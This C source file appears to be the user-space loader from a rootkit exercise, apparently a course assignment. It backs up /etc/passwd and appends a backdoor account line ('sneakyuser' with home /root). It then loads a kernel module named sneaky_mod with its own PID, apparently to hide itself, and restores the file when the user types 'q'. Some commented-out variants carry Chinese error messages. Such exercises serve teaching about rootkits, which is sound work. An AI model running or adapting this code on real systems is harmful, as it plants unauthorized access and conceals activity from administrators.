#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


void copy_file(const char * src, const char * dest) {
  if (src == NULL || dest == NULL) {
    exit(-1);
  }

  FILE * srcFile = fopen(src, "r");
  if (srcFile == NULL) {
    printf("Could not open file %s.\n", src);
    exit(-1);
  }

  FILE * destFile = fopen(dest, "w+");
  if (destFile == NULL) {
    printf("Could not open file %s.\n", dest);
    fclose(srcFile);
    exit(-1);
  }
  
  char c;
  while ((c = fgetc(srcFile)) != -1) {
    fputc(c, destFile);
  }

  fclose(destFile);
  fclose(srcFile);
}

// void copy_file(const char * src, const char * dest) {
//   FILE* srcFile = fopen(src, "rb");
//   if (srcFile == NULL) {
//       perror("无法打开源文件");
//       exit(EXIT_FAILURE);
//   }

//   FILE* destFile = fopen(dest, "wb");
//   if (destFile == NULL) {
//       perror("无法创建或打开目标文件");
//       exit(EXIT_FAILURE);
//   }
  
//   // 逐字符复制源文件到目标文件
//   char c;
//   while ((c = fgetc(srcFile)) != EOF) {
//       fputc(c, destFile);
//   }

//   if (fclose(destFile) == EOF) {
//       perror("无法关闭目标文件");
//       exit(EXIT_FAILURE);
//   }

//   if (fclose(srcFile) == EOF) {
//       perror("无法关闭源文件");
//       exit(EXIT_FAILURE);
//   }
// }

void insert_line_into_file(const char * dest, const char * line) {
  if (dest == NULL || line == NULL) {
    exit(-1);
  }

  FILE * destFile = fopen(dest, "a");
  if (destFile == NULL) {
    printf("Could not open file %s.\n", dest);
    exit(-1);
  }

  while (*line != '\0') {
    fputc(*line, destFile);
    ++line;
  }

  fclose(destFile);
}

// void insert_line_into_file(const char* filePath, const char* line) {
//   if (filePath == NULL || line == NULL) {
//     exit(EXIT_FAILURE);
//   }

//   FILE* file = fopen(filePath, "a");
//   if (file == NULL) {
//     exit(EXIT_FAILURE);
//   }

//   const char* currentChar = line;
//   while (*currentChar != '\0') {
//     char character = *currentChar;
//     fputc(*currentChar, file);
//     ++currentChar;
//   }

//   fclose(file);
// }


int main() {
  // 1. print process id
  printf("sneaky_process pid = %d\n", getpid());

  // 2. copy file from /etc/passwd to /tmp/passwd
  copy_file("/etc/passwd", "/tmp/passwd");

  // 3. insert a line to the /etc/passwd
  insert_line_into_file("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");

  // 4. load the sneaky_mod
  char args[64];
  sprintf(args, "insmod sneaky_mod.ko sneaky_pid=%d", (int) getpid());
  system(args);

  // 5. loop
  char c;
  while ((c = getchar()) != 'q') {
    // empty
  }

  // 6. unload the sneaky_mod
  system("rmmod sneaky_mod.ko");

  // 7. copy file from /tmp/passwd to /etc/passwd
  copy_file("/tmp/passwd", "/etc/passwd");

  // 8. remove /tmp/passwd
  system("rm -f /tmp/passwd");
  
  return 0;
}
